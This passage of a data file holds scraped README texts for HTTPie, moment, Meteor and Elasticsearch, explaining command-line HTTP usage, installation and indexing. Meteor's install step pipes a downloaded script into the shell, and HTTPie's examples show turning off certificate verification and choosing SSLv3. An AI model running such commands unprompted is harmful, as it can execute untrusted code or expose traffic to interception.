type=\"text\" name=\"name\" />\n    <input type=\"file\" name=\"cv\" />\n</form>\nNote that @ is used to simulate a file upload form field, whereas\n=@ just embeds the file content as a regular text field value.\n\n9\u00a0\u00a0\u00a0HTTP headers\nTo set custom headers you can use the Header:Value notation:\n$ http example.org  User-Agent:Bacon/1.0  'Cookie:valued-visitor=yes;foo=bar'  \\\n    X-Foo:Bar  Referer:http://httpie.org/\nGET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nCookie: valued-visitor=yes;foo=bar\nHost: example.org\nReferer: http://httpie.org/\nUser-Agent: Bacon/1.0\nX-Foo: Bar\n\n9.1\u00a0\u00a0\u00a0Default request headers\nThere are a couple of default headers that HTTPie sets:\nGET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nUser-Agent: HTTPie/<version>\nHost: <taken-from-URL>\nAny of these except Host can be overwritten and some of them unset.\n\n9.2\u00a0\u00a0\u00a0Empty headers and header un-setting\nTo unset a previously specified header\n(such a one of the default headers), use Header::\n$ http httpbin.org/headers Accept: User-Agent:\nTo send a header with an empty value, use Header;:\n$ http httpbin.org/headers 'Header;'\n\n10\u00a0\u00a0\u00a0Cookies\nHTTP clients send cookies to the server as regular HTTP headers. That means,\nHTTPie does not offer any special syntax for specifying cookies \u2014 the usual\nHeader:Value notation is used:\nSend a single cookie:\n$ http example.org Cookie:sessionid=foo\nGET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: sessionid=foo\nHost: example.org\nUser-Agent: HTTPie/0.9.9\nSend multiple cookies\n(note the header is quoted to prevent the shell from interpreting the ;):\n$ http example.org 'Cookie:sessionid=foo;another-cookie=bar'\nGET / HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: sessionid=foo;another-cookie=bar\nHost: example.org\nUser-Agent: HTTPie/0.9.9\nIf you often deal with cookies in your requests, then chances are you'd appreciate\nthe sessions feature.\n\n11\u00a0\u00a0\u00a0Authentication\nThe currently supported authentication schemes are Basic and Digest\n(see auth plugins for more). There are two flags that control authentication:\n\n\n--auth, -a\nPass a username:password pair as\nthe argument. Or, if you only specify a username\n(-a username), you'll be prompted for\nthe password before the request is sent.\nTo send an empty password, pass username:.\nThe username:password@hostname URL syntax is\nsupported as well (but credentials passed via -a\nhave higher priority).\n\n--auth-type, -A\nSpecify the auth mechanism. Possible values are\nbasic and digest. The default value is\nbasic so it can often be omitted.\n\n\n\n\n11.1\u00a0\u00a0\u00a0Basic auth\n$ http -a username:password example.org\n\n11.2\u00a0\u00a0\u00a0Digest auth\n$ http -A digest -a username:password example.org\n\n11.3\u00a0\u00a0\u00a0Password prompt\n$ http -a username example.org\n\n11.4\u00a0\u00a0\u00a0.netrc\nAuthentication information from your ~/.netrc file is honored as well:\n$ cat ~/.netrc\nmachine httpbin.org\nlogin httpie\npassword test\n\n$ http httpbin.org/basic-auth/httpie/test\nHTTP/1.1 200 OK\n[...]\n\n11.5\u00a0\u00a0\u00a0Auth plugins\nAdditional authentication mechanism can be installed as plugins.\nThey can be found on the Python Package Index.\nHere's a few picks:\n\nhttpie-api-auth: ApiAuth\nhttpie-aws-auth: AWS / Amazon S3\nhttpie-edgegrid: EdgeGrid\nhttpie-hmac-auth: HMAC\nhttpie-jwt-auth: JWTAuth (JSON Web Tokens)\nhttpie-negotiate: SPNEGO (GSS Negotiate)\nhttpie-ntlm: NTLM (NT LAN Manager)\nhttpie-oauth: OAuth\nrequests-hawk: Hawk\n\n\n12\u00a0\u00a0\u00a0HTTP redirects\nBy default, HTTP redirects are not followed and only the first\nresponse is shown:\n$ http httpbin.org/redirect/3\n\n12.1\u00a0\u00a0\u00a0Follow Location\nTo instruct HTTPie to follow the Location header of 30x responses\nand show the final response instead, use the --follow, -F option:\n$ http --follow httpbin.org/redirect/3\n\n12.2\u00a0\u00a0\u00a0Showing intermediary redirect responses\nIf you additionally wish to see the intermediary requests/responses,\nthen use the --all option as well:\n$ http --follow --all httpbin.org/redirect/3\n\n12.3\u00a0\u00a0\u00a0Limiting maximum redirects followed\nTo change the default limit of maximum 30 redirects, use the\n--max-redirects=<limit> option:\n$ http --follow --all --max-redirects=5 httpbin.org/redirect/3\n\n13\u00a0\u00a0\u00a0Proxies\nYou can specify proxies to be used through the --proxy argument for each\nprotocol (which is included in the value in case of redirects across protocols):\n$ http --proxy=http:http://10.10.1.10:3128 --proxy=https:https://10.10.1.10:1080 example.org\nWith Basic authentication:\n$ http --proxy=http:http://user:pass@10.10.1.10:3128 example.org\n\n13.1\u00a0\u00a0\u00a0Environment variables\nYou can also configure proxies by environment variables HTTP_PROXY and\nHTTPS_PROXY, and the underlying Requests library will pick them up as well.\nIf you want to disable proxies configured through the environment variables for\ncertain hosts, you can specify them in NO_PROXY.\nIn your ~/.bash_profile:\nexport HTTP_PROXY=http://10.10.1.10:3128\nexport HTTPS_PROXY=https://10.10.1.10:1080\nexport NO_PROXY=localhost,example.com\n\n13.2\u00a0\u00a0\u00a0SOCKS\nHomebrew-installed HTTPie comes with SOCKS proxy support out of the box. To enable SOCKS proxy support for non-Homebrew  installations, you'll need to install requests[socks] manually using pip:\n$ pip install -U requests[socks]\nUsage is the same as for other types of proxies:\n$ http --proxy=http:socks5://user:pass@host:port --proxy=https:socks5://user:pass@host:port example.org\n\n14\u00a0\u00a0\u00a0HTTPS\n\n14.1\u00a0\u00a0\u00a0Server SSL certificate verification\nTo skip the host's SSL certificate verification, you can pass --verify=no\n(default is yes):\n$ http --verify=no https://example.org\n\n14.2\u00a0\u00a0\u00a0Custom CA bundle\nYou can also use --verify=<CA_BUNDLE_PATH> to set a custom CA bundle path:\n$ http --verify=/ssl/custom_ca_bundle https://example.org\n\n14.3\u00a0\u00a0\u00a0Client side SSL certificate\nTo use a client side certificate for the SSL communication, you can pass\nthe path of the cert file with --cert:\n$ http --cert=client.pem https://example.org\nIf the private key is not contained in the cert file you may pass the\npath of the key file with --cert-key:\n$ http --cert=client.crt --cert-key=client.key https://example.org\n\n14.4\u00a0\u00a0\u00a0SSL version\nUse the --ssl=<PROTOCOL> to specify the desired protocol version to use.\nThis will default to SSL v2.3 which will negotiate the highest protocol that both\nthe server and your installation of OpenSSL support. The available protocols\nare ssl2.3, ssl3, tls1, tls1.1, tls1.2, tls1.3. (The actually\navailable set of protocols may vary depending on your OpenSSL installation.)\n# Specify the vulnerable SSL v3 protocol to talk to an outdated server:\n$ http --ssl=ssl3 https://vulnerable.example.org\n\n14.5\u00a0\u00a0\u00a0SNI (Server Name Indication)\nIf you use HTTPie with Python version lower than 2.7.9\n(can be verified with http --debug) and need to talk to servers that\nuse SNI (Server Name Indication) you need to install some additional\ndependencies:\n$ pip install --upgrade requests[security]\nYou can use the following command to test SNI support:\n$ http https://sni.velox.ch\n\n15\u00a0\u00a0\u00a0Output options\nBy default, HTTPie only outputs the final response and the whole response\nmessage is printed (headers as well as the body). You can control what should\nbe printed via several options:\n\n\n--headers, -h\nOnly the response headers are printed.\n\n--body, -b\nOnly the response body is printed.\n\n--verbose, -v\nPrint the whole HTTP exchange (request and response).\nThis option also enables --all (see below).\n\n--print, -p\nSelects parts of the HTTP exchange.\n\n\n\n--verbose can often be useful for debugging the request and generating\ndocumentation examples:\n$ http --verbose PUT httpbin.org/put hello=world\nPUT /put HTTP/1.1\nAccept: application/json, */*\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nHost: httpbin.org\nUser-Agent: HTTPie/0.2.7dev\n\n{\n    \"hello\": \"world\"\n}\n\n\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 477\nContent-Type: application/json\nDate: Sun, 05 Aug 2012 00:25:23 GMT\nServer: gunicorn/0.13.4\n\n{\n    [\u2026]\n}\n\n15.1\u00a0\u00a0\u00a0What parts of the HTTP exchange should be printed\nAll the other output options are under the hood just shortcuts for\nthe more powerful --print, -p. It accepts a string of characters each\nof which represents a specific part of the HTTP exchange:\n\n\nCharacter\nStands for\n\n\n\nH\nrequest headers\n\nB\nrequest body\n\nh\nresponse headers\n\nb\nresponse body\n\n\n\nPrint request and response headers:\n$ http --print=Hh PUT httpbin.org/put hello=world\n\n15.2\u00a0\u00a0\u00a0Viewing intermediary requests/responses\nTo see all the HTTP communication, i.e. the final request/response as\nwell as any possible  intermediary requests/responses, use the --all\noption. The intermediary HTTP communication include followed redirects\n(with --follow), the first unauthorized request when HTTP digest\nauthentication is used (--auth=digest), etc.\n# Include all responses that lead to the final one:\n$ http --all --follow httpbin.org/redirect/3\nThe intermediary requests/response are by default formatted according to\n--print, -p (and its shortcuts described above). If you'd like to change\nthat, use the --history-print, -P option. It takes the same\narguments as --print, -p but applies to the intermediary requests only.\n# Print the intermediary requests/responses differently than the final one:\n$ http -A digest -a foo:bar --all -p Hh -P H httpbin.org/digest-auth/auth/foo/bar\n\n15.3\u00a0\u00a0\u00a0Conditional body download\nAs an optimization, the response body is downloaded from the server\nonly if it's part of the output. This is similar to performing a HEAD\nrequest, except that it applies to any HTTP method you use.\nLet's say that there is an API that returns the whole resource when it is\nupdated, but you are only interested in the response headers to see the\nstatus code after an update:\n$ http --headers PATCH example.org/Really-Huge-Resource name='New Name'\nSince we are only printing the HTTP headers here, the connection to the server\nis closed as soon as all the response headers have been received.\nTherefore, bandwidth and time isn't wasted downloading the body\nwhich you don't care about. The response headers are downloaded always,\neven if they are not part of the output\n\n16\u00a0\u00a0\u00a0Redirected Input\nThe universal method for passing request data is through redirected stdin\n(standard input)\u2014piping. Such data is buffered and then with no further\nprocessing used as the request body. There are multiple useful ways to use\npiping:\nRedirect from a file:\n$ http PUT example.com/person/1 X-API-Token:123 < person.json\nOr the output of another program:\n$ grep '401 Unauthorized' /var/log/httpd/error_log | http POST example.org/intruders\nYou can use echo for simple data:\n$ echo '{\"name\": \"John\"}' | http PATCH example.com/person/1 X-API-Token:123\nYou can also use a Bash here string:\n$ http example.com/ <<<'{\"name\": \"John\"}'\nYou can even pipe web services together using HTTPie:\n$ http GET https://api.github.com/repos/jakubroztocil/httpie | http POST httpbin.org/post\nYou can use cat to enter multiline data on the terminal:\n$ cat | http POST example.com\n<paste>\n^D\n$ cat | http POST example.com/todos Content-Type:text/plain\n- buy milk\n- call parents\n^D\nOn OS X, you can send the contents of the clipboard with pbpaste:\n$ pbpaste | http PUT example.com\nPassing data through stdin cannot be combined with data fields specified\non the command line:\n$ echo 'data' | http POST example.org more=data   # This is invalid\nTo prevent HTTPie from reading stdin data you can use the\n--ignore-stdin option.\n\n16.1\u00a0\u00a0\u00a0Request data from a filename\nAn alternative to redirected stdin is specifying a filename (as\n@/path/to/file) whose content is used as if it came from stdin.\nIt has the advantage that the Content-Type\nheader is automatically set to the appropriate value based on the\nfilename extension. For example, the following request sends the\nverbatim contents of that XML file with Content-Type: application/xml:\n$ http PUT httpbin.org/put @/data/file.xml\n\n17\u00a0\u00a0\u00a0Terminal output\nHTTPie does several things by default in order to make its terminal output\neasy to read.\n\n17.1\u00a0\u00a0\u00a0Colors and formatting\nSyntax highlighting is applied to HTTP headers and bodies (where it makes\nsense). You can choose your preferred color scheme via the --style option\nif you don't like the default one (see $ http --help for the possible\nvalues).\nAlso, the following formatting is applied:\n\nHTTP headers are sorted by name.\nJSON data is indented, sorted by keys, and unicode escapes are converted\nto the characters they represent.\n\nOne of these options can be used to control output processing:\n\n\n--pretty=all\nApply both colors and formatting.\nDefault for terminal output.\n\n--pretty=colors\nApply colors.\n\n--pretty=format\nApply formatting.\n\n--pretty=none\nDisables output processing.\nDefault for redirected output.\n\n\n\n\n17.2\u00a0\u00a0\u00a0Binary data\nBinary data is suppressed for terminal output, which makes it safe to perform\nrequests to URLs that send back binary data. Binary data is suppressed also in\nredirected, but prettified output. The connection is closed as soon as we know\nthat the response body is binary,\n$ http example.org/Movie.mov\nYou will nearly instantly see something like this:\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nContent-Encoding: gzip\nContent-Type: video/quicktime\nTransfer-Encoding: chunked\n\n+-----------------------------------------+\n| NOTE: binary data not shown in terminal |\n+-----------------------------------------+\n\n18\u00a0\u00a0\u00a0Redirected output\nHTTPie uses a different set of defaults for redirected output than for\nterminal output. The differences being:\n\nFormatting and colors aren't applied (unless --pretty is specified).\nOnly the response body is printed (unless one of the output options is set).\nAlso, binary data isn't suppressed.\n\nThe reason is to make piping HTTPie's output to another programs and\ndownloading files work with no extra flags. Most of the time, only the raw\nresponse body is of an interest when the output is redirected.\nDownload a file:\n$ http example.org/Movie.mov > Movie.mov\nDownload an image of Octocat, resize it using ImageMagick, upload it elsewhere:\n$ http octodex.github.com/images/original.jpg | convert - -resize 25% -  | http example.org/Octocats\nForce colorizing and formatting, and show both the request and the response in\nless pager:\n$ http --pretty=all --verbose example.org | less -R\nThe -R flag tells less to interpret color escape sequences included\nHTTPie`s output.\nYou can create a shortcut for invoking HTTPie with colorized and paged output\nby adding the following to your ~/.bash_profile:\nfunction httpless {\n    # `httpless example.org'\n    http --pretty=all --print=hb \"$@\" | less -R;\n}\n\n19\u00a0\u00a0\u00a0Download mode\nHTTPie features a download mode in which it acts similarly to wget.\nWhen enabled using the --download, -d flag, response headers are printed to\nthe terminal (stderr), and a progress bar is shown while the response body\nis being saved to a file.\n$ http --download https://github.com/jakubroztocil/httpie/archive/master.tar.gz\nHTTP/1.1 200 OK\nContent-Disposition: attachment; filename=httpie-master.tar.gz\nContent-Length: 257336\nContent-Type: application/x-gzip\n\nDownloading 251.30 kB to \"httpie-master.tar.gz\"\nDone. 251.30 kB in 2.73862s (91.76 kB/s)\n\n19.1\u00a0\u00a0\u00a0Downloaded file name\nIf not provided via --output, -o, the output filename will be determined\nfrom Content-Disposition (if available), or from the URL and\nContent-Type. If the guessed filename already exists, HTTPie adds a unique\nsuffix to it.\n\n19.2\u00a0\u00a0\u00a0Piping while downloading\nYou can also redirect the response body to another program while the response\nheaders and progress are still shown in the terminal:\n$ http -d https://github.com/jakubroztocil/httpie/archive/master.tar.gz |  tar zxf -\n\n19.3\u00a0\u00a0\u00a0Resuming downloads\nIf --output, -o is specified, you can resume a partial download using the\n--continue, -c option. This only works with servers that support\nRange requests and 206 Partial Content responses. If the server doesn't\nsupport that, the whole file will simply be downloaded:\n$ http -dco file.zip example.org/file\n\n19.4\u00a0\u00a0\u00a0Other notes\n\nThe --download option only changes how the response body is treated.\nYou can still set custom headers, use sessions, --verbose, -v, etc.\n--download always implies --follow (redirects are followed).\nHTTPie exits with status code 1 (error) if the body hasn't been fully\ndownloaded.\nAccept-Encoding cannot be set with --download.\n\n\n20\u00a0\u00a0\u00a0Streamed responses\nResponses are downloaded and printed in chunks which allows for streaming\nand large file downloads without using too much memory. However, when\ncolors and formatting is applied, the whole response is buffered and only\nthen processed at once.\n\n20.1\u00a0\u00a0\u00a0Disabling buffering\nYou can use the --stream, -S flag to make two things happen:\n\nThe output is flushed in much smaller chunks without any buffering,\nwhich makes HTTPie behave kind of like tail -f for URLs.\nStreaming becomes enabled even when the output is prettified: It will be\napplied to each line of the response and flushed immediately. This makes\nit possible to have a nice output for long-lived requests, such as one\nto the Twitter streaming API.\n\n\n20.2\u00a0\u00a0\u00a0Examples use cases\nPrettified streamed response:\n$ http --stream -f -a YOUR-TWITTER-NAME https://stream.twitter.com/1/statuses/filter.json track='Justin Bieber'\nStreamed output by small chunks al\u00e1 tail -f:\n# Send each new tweet (JSON object) mentioning \"Apple\" to another\n# server as soon as it arrives from the Twitter streaming API:\n$ http --stream -f -a YOUR-TWITTER-NAME https://stream.twitter.com/1/statuses/filter.json track=Apple \\\n| while read tweet; do echo \"$tweet\" | http POST example.org/tweets ; done\n\n21\u00a0\u00a0\u00a0Sessions\nBy default, every request HTTPie makes is completely independent of any\nprevious ones to the same host.\nHowever, HTTPie also supports persistent\nsessions via the --session=SESSION_NAME_OR_PATH option. In a session,\ncustom HTTP headers (except for the ones starting with Content- or If-),\nauthentication, and cookies\n(manually specified or sent by the server) persist between requests\nto the same host.\n# Create a new session\n$ http --session=/tmp/session.json example.org API-Token:123\n\n# Re-use an existing session \u2014 API-Token will be set:\n$ http --session=/tmp/session.json example.org\nAll session data, including credentials, cookie data,\nand custom headers are stored in plain text.\nThat means session files can also be created and edited manually in a text\neditor\u2014they are regular JSON. It also means that they can be read by anyone\nwho has access to the session file.\n\n21.1\u00a0\u00a0\u00a0Named sessions\nYou can create one or more named session per host. For example, this is how\nyou can create a new session named user1 for example.org:\n$ http --session=user1 -a user1:password example.org X-Foo:Bar\nFrom now on, you can refer to the session by its name. When you choose to\nuse the session again, any previously specified authentication or HTTP headers\nwill automatically be set:\n$ http --session=user1 example.org\nTo create or reuse a different session, simple specify a different name:\n$ http --session=user2 -a user2:password example.org X-Bar:Foo\nNamed sessions' data is stored in JSON files in the directory\n~/.httpie/sessions/<host>/<name>.json\n(%APPDATA%\\httpie\\sessions\\<host>\\<name>.json on Windows).\n\n21.2\u00a0\u00a0\u00a0Anonymous sessions\nInstead of a name, you can also directly specify a path to a session file. This\nallows for sessions to be re-used across multiple hosts:\n$ http --session=/tmp/session.json example.org\n$ http --session=/tmp/session.json admin.example.org\n$ http --session=~/.httpie/sessions/another.example.org/test.json example.org\n$ http --session-read-only=/tmp/session.json example.org\n\n21.3\u00a0\u00a0\u00a0Readonly session\nTo use an existing session file without updating it from the request/response\nexchange once it is created, specify the session name via\n--session-read-only=SESSION_NAME_OR_PATH instead.\n\n22\u00a0\u00a0\u00a0Config\nHTTPie uses a simple JSON config file.\n\n22.1\u00a0\u00a0\u00a0Config file location\nThe default location of the configuration file is ~/.httpie/config.json\n(or %APPDATA%\\httpie\\config.json on Windows). The config directory\nlocation can be changed by setting the HTTPIE_CONFIG_DIR\nenvironment variable. To view the exact location run http --debug.\n\n22.2\u00a0\u00a0\u00a0Configurable options\nThe JSON file contains an object with the following keys:\n\n22.2.1\u00a0\u00a0\u00a0default_options\nAn Array (by default empty) of default options that should be applied to\nevery invocation of HTTPie.\nFor instance, you can use this option to change the default style and output\noptions: \"default_options\": [\"--style=fruity\", \"--body\"] Another useful\ndefault option could be \"--session=default\" to make HTTPie always\nuse sessions (one named default will automatically be used).\nOr you could change the implicit request content type from JSON to form by\nadding --form to the list.\n\n22.2.2\u00a0\u00a0\u00a0__meta__\nHTTPie automatically stores some of its metadata here. Please do not change.\n\n22.3\u00a0\u00a0\u00a0Un-setting previously specified options\nDefault options from the config file, or specified any other way,\ncan be unset for a particular invocation via --no-OPTION arguments passed\non the command line (e.g., --no-style or --no-session).\n\n23\u00a0\u00a0\u00a0Scripting\nWhen using HTTPie from shell scripts, it can be handy to set the\n--check-status flag. It instructs HTTPie to exit with an error if the\nHTTP status is one of 3xx, 4xx, or 5xx. The exit status will\nbe 3 (unless --follow is set), 4, or 5,\nrespectively.\n#!/bin/bash\n\nif http --check-status --ignore-stdin --timeout=2.5 HEAD example.org/health &> /dev/null; then\n    echo 'OK!'\nelse\n    case $? in\n        2) echo 'Request timed out!' ;;\n        3) echo 'Unexpected HTTP 3xx Redirection!' ;;\n        4) echo 'HTTP 4xx Client Error!' ;;\n        5) echo 'HTTP 5xx Server Error!' ;;\n        6) echo 'Exceeded --max-redirects=<n> redirects!' ;;\n        *) echo 'Other Error!' ;;\n    esac\nfi\n\n23.1\u00a0\u00a0\u00a0Best practices\nThe default behaviour of automatically reading stdin is typically not\ndesirable during non-interactive invocations. You most likely want to\nuse the --ignore-stdin option to disable it.\nIt is a common gotcha that without this option HTTPie seemingly hangs.\nWhat happens is that when HTTPie is invoked for example from a cron job,\nstdin is not connected to a terminal.\nTherefore, rules for redirected input apply, i.e., HTTPie starts to read it\nexpecting that the request body will be passed through.\nAnd since there's no data nor EOF, it will be stuck. So unless you're\npiping some data to HTTPie, this flag should be used in scripts.\nAlso, it might be good to override the default 30 second --timeout to\nsomething that suits you.\n\n24\u00a0\u00a0\u00a0Meta\n\n24.1\u00a0\u00a0\u00a0Interface design\nThe syntax of the command arguments closely corresponds to the actual HTTP\nrequests sent over the wire. It has the advantage  that it's easy to remember\nand read. It is often possible to translate an HTTP request to an HTTPie\nargument list just by inlining the request elements. For example, compare this\nHTTP request:\nPOST /collection HTTP/1.1\nX-API-Key: 123\nUser-Agent: Bacon/1.0\nContent-Type: application/x-www-form-urlencoded\n\nname=value&name2=value2\nwith the HTTPie command that sends it:\n$ http -f POST example.org/collection \\\n  X-API-Key:123 \\\n  User-Agent:Bacon/1.0 \\\n  name=value \\\n  name2=value2\nNotice that both the order of elements and the syntax is very similar,\nand that only a small portion of the command is used to control HTTPie and\ndoesn't directly correspond to any part of the request (here it's only -f\nasking HTTPie to send a form request).\nThe two modes, --pretty=all (default for terminal) and --pretty=none\n(default for redirected output), allow for both user-friendly interactive use\nand usage from scripts, where HTTPie serves as a generic HTTP client.\nAs HTTPie is still under heavy development, the existing command line\nsyntax and some of the --OPTIONS may change slightly before\nHTTPie reaches its final version 1.0. All changes are recorded in the\nchange log.\n\n24.2\u00a0\u00a0\u00a0User support\nPlease use the following support channels:\n\nGitHub issues\nfor bug reports and feature requests.\nOur Gitter chat room\nto ask questions, discuss features, and for general discussion.\nStackOverflow\nto ask questions (please make sure to use the\nhttpie tag).\nTweet directly to @clihttp.\nYou can also tweet directly to @jakubroztocil.\n\n\n24.3\u00a0\u00a0\u00a0Related projects\n\n24.3.1\u00a0\u00a0\u00a0Dependencies\nUnder the hood, HTTPie uses these two amazing libraries:\n\nRequests\n\u2014 Python HTTP library for humans\nPygments\n\u2014 Python syntax highlighter\n\n\n24.3.2\u00a0\u00a0\u00a0HTTPie friends\nHTTPie plays exceptionally well with the following tools:\n\njq\n\u2014 CLI JSON processor that\nworks great in conjunction with HTTPie\nhttp-prompt\n\u2014  interactive shell for HTTPie featuring autocomplete\nand command syntax highlighting\n\n\n24.3.3\u00a0\u00a0\u00a0Alternatives\n\nhttpcat \u2014 a lower-level sister utility\nof HTTPie for constructing raw HTTP requests on the command line.\ncurl \u2014 a \"Swiss knife\" command line tool and\nan exceptional library for transferring data with URLs.\n\n\n24.4\u00a0\u00a0\u00a0Contributing\nSee CONTRIBUTING.rst.\n\n24.5\u00a0\u00a0\u00a0Change log\nSee CHANGELOG.\n\n24.6\u00a0\u00a0\u00a0Artwork\n\nLogo by Cl\u00e1udia Delgado.\nAnimation by Allen Smith of GitHub.\n\n\n24.7\u00a0\u00a0\u00a0Licence\nBSD-3-Clause: LICENSE.\n\n24.8\u00a0\u00a0\u00a0Authors\nJakub Roztocil  (@jakubroztocil) created HTTPie and these fine people\nhave contributed."}, {"title": "moment/moment", "language": "JavaScript", "content": "A lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\nDocumentation\nPort to ECMAScript 6 (version 2.10.0)\nMoment 2.10.0 does not bring any new features, but the code is now written in\nECMAScript 6 modules and placed inside src/. Previously moment.js, locale/*.js and\ntest/moment/*.js, test/locale/*.js contained the source of the project. Now\nthe source is in src/, temporary build (ECMAScript 5) files are placed under\nbuild/umd/ (for running tests during development), and the moment.js and\nlocale/*.js files are updated only on release.\nIf you want to use a particular revision of the code, make sure to run\ngrunt transpile update-index, so moment.js and locales/*.js are synced\nwith src/*. We might place that in a commit hook in the future.\nUpgrading to 2.0.0\nThere are a number of small backwards incompatible changes with version 2.0.0. See the full descriptions here\n\n\nChanged language ordinal method to return the number + ordinal instead of just the ordinal.\n\n\nChanged two digit year parsing cutoff to match strptime.\n\n\nRemoved moment#sod and moment#eod in favor of moment#startOf and moment#endOf.\n\n\nRemoved moment.humanizeDuration() in favor of moment.duration().humanize().\n\n\nRemoved the lang data objects from the top level namespace.\n\n\nDuplicate Date passed to moment() instead of referencing it.\n\n\nChangelog\nContributing \nWe're looking for co-maintainers! If you want to become a master of time please\nwrite to ichernev.\nIn addition to contributing code, you can help to triage issues. This can include reproducing bug reports, or asking for vital information such as version numbers or reproduction instructions. If you would like to start triaging issues, one easy way to get started is to subscribe to moment/moment on CodeTriage.\nLicense\nMoment.js is freely distributable under the terms of the MIT license."}, {"title": "meteor/meteor", "language": "JavaScript", "content": "Meteor is an ultra-simple environment for building modern web\napplications.\nWith Meteor you write apps:\n\nin modern JavaScript\nthat send data over the wire, rather than HTML\nusing your choice of popular open-source libraries\n\nTry a getting started tutorial:\n\nReact\nBlaze\nAngular\n\nNext, read the guide and the documentation.\nQuick Start\nOn Windows, the installer can be found at https://www.meteor.com/install.\nOn Linux/macOS, use this line:\ncurl https://install.meteor.com/ | sh\nCreate a project:\nmeteor create try-meteor\nRun it:\ncd try-meteor\nmeteor\nDeveloper Resources\nBuilding an application with Meteor?\n\nAnnouncement list: sign up at http://www.meteor.com/\nHaving problems? Ask for help at: http://stackoverflow.com/questions/tagged/meteor\nDiscussion forums: https://forums.meteor.com/\n\nInterested in helping or contributing to Meteor?  These resources will help:\n\nCore development guide\nContribution guidelines\nFeature requests\nIssue tracker\n\nWe are hiring!  Visit meteor.io/jobs to\nlearn more about working full-time on the Meteor project.\nUninstalling Meteor\nAside from a short launcher shell script, Meteor installs itself inside your\nhome directory. To uninstall Meteor, run:\nrm -rf ~/.meteor/\nsudo rm /usr/local/bin/meteor\nOn Windows, just run the uninstaller from your Control Panel."}, {"title": "elastic/elasticsearch", "language": "Java", "content": "Elasticsearch\nA Distributed RESTful Search Engine\nhttps://www.elastic.co/products/elasticsearch\nElasticsearch is a distributed RESTful search engine built for the cloud. Features include:\n\nDistributed and Highly Available Search Engine.\n\t\nEach index is fully sharded with a configurable number of shards.\nEach shard can have one or more replicas.\nRead / Search operations performed on any of the replica shards.\n\nMulti Tenant.\n\t\nSupport for more than one index.\nIndex level configuration (number of shards, index storage, \u2026).\n\nVarious set of APIs\n\t\nHTTP RESTful API\nNative Java API.\nAll APIs perform automatic node operation rerouting.\n\nDocument oriented\n\t\nNo need for upfront schema definition.\nSchema can be defined for customization of the indexing process.\n\nReliable, Asynchronous Write Behind for long term persistency.\n(Near) Real Time Search.\nBuilt on top of Lucene\n\t\nEach shard is a fully functional Lucene index\nAll the power of Lucene easily exposed through simple configuration / plugins.\n\nPer operation consistency\n\t\nSingle document level operations are atomic, consistent, isolated and durable.\n\n\nGetting Started\nFirst of all, DON\u2019T PANIC. It will take 5 minutes to get the gist of what Elasticsearch is all about.\nRequirements\nYou need to have a recent version of Java installed. See the Setup page for more information.\nInstallation\n\nDownload and unzip the Elasticsearch official distribution.\nRun bin/elasticsearch on unix, or bin\\elasticsearch.bat on windows.\nRun curl -X GET http://localhost:9200/.\nStart more servers \u2026\n\nIndexing\nLet\u2019s try and index some twitter like information. First, let\u2019s index some tweets (the twitter index will be created automatically):\ncurl -XPUT 'http://localhost:9200/twitter/_doc/1?pretty' -H 'Content-Type: application/json' -d '\n{\n    \"user\": \"kimchy\",\n    \"post_date\": \"2009-11-15T13:12:00\",\n    \"message\": \"Trying out Elasticsearch, so far so good?\"\n}'\n\ncurl -XPUT 'http://localhost:9200/twitter/_doc/2?pretty' -H 'Content-Type: application/json' -d '\n{\n    \"user\": \"kimchy\",\n    \"post_date\": \"2009-11-15T14:12:12\",\n    \"message\": \"Another tweet, will it be indexed?\"\n}'\n\ncurl -XPUT 'http://localhost:9200/twitter/_doc/3?pretty' -H 'Content-Type: application/json' -d '\n{\n    \"user\": \"elastic\",\n    \"post_date\": \"2010-01-15T01:46:38\",\n    \"message\": \"Building the site, should be kewl\"\n}'\n\nNow, let\u2019s see if the information was added by GETting it:\ncurl -XGET 'http://localhost:9200/twitter/_doc/1?pretty=true'\ncurl -XGET 'http://localhost:9200/twitter/_doc/2?pretty=true'\ncurl -XGET 'http://localhost:9200/twitter/_doc/3?pretty=true'\n\nSearching\nMmm search\u2026, shouldn\u2019t it be elastic?\nLet\u2019s find all the tweets that kimchy posted:\ncurl -XGET 'http://localhost:9200/twitter/_search?q=user:kimchy&pretty=true'\n\nWe can also use the JSON query language Elasticsearch provides instead of a query string:\ncurl -XGET 'http://localhost:9200/twitter/_search?pretty=true' -H 'Content-Type: application/json' -d '\n{\n    \"query\" : {\n        \"match\" : { \"user\": \"kimchy\" }\n    }\n}'\n\nJust for kicks, let\u2019s get all the documents stored (we should see the tweet from elastic as well):\ncurl -XGET 'http://localhost:9200/twitter/_search?pretty=true' -H 'Content-Type: application/json' -d '\n{\n    \"query\" : {\n        \"match_all\" : {}\n    }\n}'\n\nWe can also do range search (the post_date was automatically identified as date)\ncurl -XGET 'http://localhost:9200/twitter/_search?pretty=true' -H 'Content-Type: application/json' -d '\n{\n    \"query\" : {\n        \"range\" : {\n            \"post_date\" : { \"from\" : \"2009-11-15T13:00:00\", \"to\" : \"2009-11-15T14:00:00\" }\n        }\n    }\n}'\n\nThere are many more options to perform search, after all, it\u2019s a search product no? All the familiar Lucene queries are available through the JSON query language, or through the query parser.\nMulti Tenant \u2013 Indices and Types\nMan, that twitter index might get big (in this case, index size == valuation). Let\u2019s see if we can structure our twitter system a bit differently in order to support such large amounts of data.\nElasticsearch supports multiple indices. In the previous example we used an index called twitter that stored tweets for every user.\nAnother way to define our simple twitter system is to have a different index per user (note, though that each index has an overhead). Here is the indexing curl\u2019s in this case:\ncurl -XPUT 'http://localhost:9200/kimchy/_doc/1?pretty' -H 'Content-Type: application/json' -d '\n{\n    \"user\": \"kimchy\",\n    \"post_date\": \"2009-11-15T13:12:00\",\n    \"message\": \"Trying out Elasticsearch, so far so good?\"\n}'\n\ncurl -XPUT 'http://localhost:9200/kimchy/_doc/2?pretty' -H 'Content-Type: application/json' -d '\n{\n    \"user\": \"kimchy\",\n    \"post_date\": \"2009-11-15T14:12:12\",\n    \"message\": \"Another tweet, will it be indexed?\"\n}'\n\nThe above will index information into the kimchy index. Each user will get their own special index.\nComplete control on the index level is allowed. As an example, in the above case, 